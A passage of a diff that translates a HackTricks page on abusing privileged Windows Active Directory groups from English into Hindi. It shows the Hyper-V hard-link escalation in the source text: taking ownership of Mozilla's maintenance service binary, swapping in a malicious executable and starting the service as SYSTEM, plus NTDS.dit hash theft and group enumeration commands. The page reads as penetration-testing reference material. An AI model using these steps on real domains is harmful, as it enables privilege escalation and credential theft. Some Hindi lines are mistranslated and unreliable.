 #Get members of the group
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Hyper-V प्रशासक
 
-## Hyper-V Administrators
+[**Hyper-V प्रशासक**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) समूह को सभी [Hyper-V सुविधाओं](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) का पूरा उपयोग करने की अनुमति होती है। यदि **डोमेन कंट्रोलर्स** को **वर्चुअलाइज़्ड** किया गया है, तो **वर्चुअलाइज़ेशन व्यवस्थापक** को **डोमेन एडमिन्स** के रूप में विचार किया जाना चाहिए। वे आसानी से **लाइव डोमेन कंट्रोलर की क्लोन बना सकते हैं** और वर्चुअल **डिस्क** को ऑफ़लाइन माउंट करके **`NTDS.dit`** फ़ाइल प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं के NTLM पासवर्ड हैश निकाल सकते हैं।
 
-The [**Hyper-V Administrators**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If **Domain Controllers** have been **virtualized**, then the **virtualization admins** should be considered **Domain Admins**. They could easily **create a clone of the live Domain Controller** and **mount** the virtual **disk** offline to obtain the **`NTDS.dit`** file and extract NTLM password hashes for all users in the domain.
+इस [ब्लॉग](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) पर भी अच्छी तरह से दस्तावेज़ीकृत है कि एक वर्चुअल मशीन को **हटाने** पर, `vmms.exe` संबंधित **`.vhdx` फ़ाइल** पर मूल फ़ाइल अनुमतियों को **पुनर्स्थापित** करने का प्रयास करता है और यह `NT AUTHORITY\SYSTEM` के रूप में करता है, उपयोगकर्ता की अनुकरण करके नहीं। हम **`.vhdx`** फ़ाइल को **हटा सकते हैं** और इस फ़ाइल को एक सुरक्षित SYSTEM फ़ाइल के लिए एक प्राकृतिक **हार्ड लिंक** बनाने के लिए निम्नलिखित अनुमतियों को प्रदान कर सकते हैं, और आपको पूरी अनुमति मिलेगी।
 
-It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon **deleting** a virtual machine, `vmms.exe` attempts to **restore the original file permissions** on the corresponding **`.vhdx` file** and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can **delete the `.vhdx`** file and **create** a native **hard link** to point this file to a **protected SYSTEM file**, and you will be given full permissions to.
+यदि ऑपरेटिंग सिस्टम [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) या [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) के लिए संकटग्रस्त है, तो हम इसका उपयोग करके SYSTEM विशेषाधिकार प्राप्त कर सकते हैं। अन्यथा, हम कोशिश कर सकते हैं कि **सर्वर पर एक ऐसे एप्लिकेशन का लाभ उठाएं जिसने SYSTEM के संदर्भ में चलने वाली सेवा स्थापित की है**, जिसे अनधिकृत उपयोगकर्ता शुरू कर सकते हैं।
 
-If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to **take advantage of an application on the server that has installed a service running in the context of SYSTEM**, which is startable by unprivileged users.
+### **शोषण उदाहरण**
 
-### **Exploitation Example**
-
-An example of this is **Firefox**, which installs the **`Mozilla Maintenance Service`**. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:
-
+इसका एक उदाहरण है **Firefox**, जो **`Mozilla Maintenance Service`** स्थापित करता है। हम इस [एक्सप्लॉइट](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT हार्ड लिंक के लिए प्रमाण-उदाहरण) को अपडेट कर सकते हैं ताकि हमारे मौजूदा उपयोगकर्ता को निम्नलिखित फ़ाइल पर पूरी अनुमति मिले:
 ```bash
 C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 ```
+#### **फ़ाइल के स्वामित्व को अधिकार में लेना**
 
-#### **Taking Ownership of the File**
-
-After running the PowerShell script, we should have **full control of this file and can take ownership of it**.
-
+PowerShell स्क्रिप्ट चलाने के बाद, हमें इस फ़ाइल के पूर्ण नियंत्रण होना चाहिए और हम इसके स्वामित्व को अधिकार में ले सकते हैं।
 ```bash
 C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 ```
+#### **मोज़िला रखरखाव सेवा को शुरू करना**
 
-#### **Starting the Mozilla Maintenance Service**
-
-Next, we can replace this file with a **malicious `maintenanceservice.exe`**, **start** the maintenance **service**, and get command execution as SYSTEM.
-
+अगले, हम इस फ़ाइल को एक **हानिकारक `maintenanceservice.exe`** के साथ बदल सकते हैं, मेंटेनेंस सेवा को **शुरू** कर सकते हैं, और SYSTEM के रूप में कमांड निष्पादन प्राप्त कर सकते हैं।
 ```
 C:\htb> sc.exe start MozillaMaintenance
 ```
-
 {% hint style="info" %}
-This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
+यह वेक्टर मार्च 2020 के विंडोज सुरक्षा अपडेट द्वारा न्यूनतम किया गया है, जो हार्ड लिंक्स से संबंधित व्यवहार को बदल देता है।
 {% endhint %}
 
-## Organization Management
+## संगठन प्रबंधन
 
-This group is also in environments with **Microsoft Exchange** installed.\
-members of this group can **access** the **mailboxes** of **all** domain users.\
-This group also has **full control** of the OU called `Microsoft Exchange Security Groups`, which contains the group [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (follow the link to see how to abuse this group to privesc).
+इस समूह में भी **माइक्रोसॉफ्ट एक्सचेंज** स्थापित वातावरण होता है।\
+इस समूह के सदस्य **सभी** डोमेन उपयोगकर्ताओं के **मेलबॉक्स** तक **पहुंच** प्राप्त कर सकते हैं।\
+इस समूह को भी `Microsoft Exchange Security Groups` नामक OU का **पूर्ण नियंत्रण** होता है, जिसमें समूह [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) होता है \*\*\*\* (इस समूह का दुरुपयोग करके प्राइवेसी प्रशासन करने के लिए लिंक पर क्लिक करें)।
 
-## Print Operators
+## प्रिंट ऑपरेटर्स
 
-The members of this gorup are granted:
+इस समूह के सदस्यों को निम्नलिखित प्राप्त होता है:
 
 * [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
-* **Log on locally to a Domain Controller** and shut it down
-* Permissions to **manage**, create, share, and delete **printers connected to a Domain Controller**
+* **एक डोमेन कंट्रोलर पर स्थानीय रूप से लॉग ऑन करें** और उसे बंद करें
+* एक डोमेन कंट्रोलर से जुड़े प्रिंटर्स को **प्रबंधित**, बनाएँ, साझा करें और हटाएँ करने की अनुमति
 
 {% hint style="warning" %}
-If the command `whoami /priv`, doesn't show the **`SeLoadDriverPrivilege`** from an unelevated context, you need to bypass UAC.
+यदि अनउच्च विषयमें से `whoami /priv` कमांड ने **`SeLoadDriverPrivilege`** नहीं दिखाया है, तो आपको UAC को दौर करने की आवश्यकता है।
 {% endhint %}
 
-Get **members** of the group:
-
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-
-Check in this page how to abuse the SeLoadDriverPrivilege to privesc:
-
-{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
-[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
-{% endcontent-ref %}
-
-## Remote Desktop Users
-
-Members of this group can access the PCs over RDP.\
-Get **members** of the group:
-
+इस समूह के सदस्य PC पर RDP के माध्यम से पहुंच सकते हैं।\
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-
-More info about **RDP**:
+आरडीपी के बारे में अधिक जानकारी:
 
 {% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
 [pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
 {% endcontent-ref %}
 
-## Remote Management Users
+## दूरस्थ प्रबंधन उपयोगकर्ता
 
-Members of this group can access PCs over **WinRM**.
-
+इस समूह के सदस्य **WinRM** के माध्यम से PC तक पहुंच सकते हैं।
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-
-More info about **WinRM**:
+विनर्म के बारे में अधिक जानकारी:
 
 {% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
 [5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
 {% endcontent-ref %}
 
-## Server Operators <a href="#server-operators" id="server-operators"></a>
+## सर्वर ऑपरेटर <a href="#server-operators" id="server-operators"></a>
 
-This membership allows users to configure Domain Controllers with the following privileges:
+इस सदस्यता से उपयोगकर्ताओं को निम्नलिखित विशेषाधिकारों के साथ डोमेन कंट्रोलर को कॉन्फ़िगर करने की अनुमति होती है:
 
-* Allow log on locally
-* Back up files and directories
-* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
-* Change the system time
-* Change the time zone
-* Force shutdown from a remote system
-* Restore files and directories
-* Shut down the system
-* control local services
+* स्थानीय रूप से लॉग ऑन करने की अनुमति
+* फ़ाइल और निर्देशिकाओं का बैकअप करने की अनुमति
+* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
+* सिस्टम का समय बदलने की अनुमति
+* समय क्षेत्र बदलने की अनुमति
+* दूरस्थ सिस्टम से शटडाउन करने की अनुमति
+* फ़ाइल और निर्देशिकाओं को बहाल करने की अनुमति
+* सिस्टम को बंद करने की अनुमति
+* स्थानीय सेवाओं को नियंत्रित करने की अनुमति
 
-Get **members** of the group:
-
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-## References <a href="#references" id="references"></a>
+## संदर्भ <a href="#references" id="references"></a>
 
 {% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}
 
@@ -484,10 +420,10 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** हो? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
+* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण करें।**
+* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**
 
 </details>
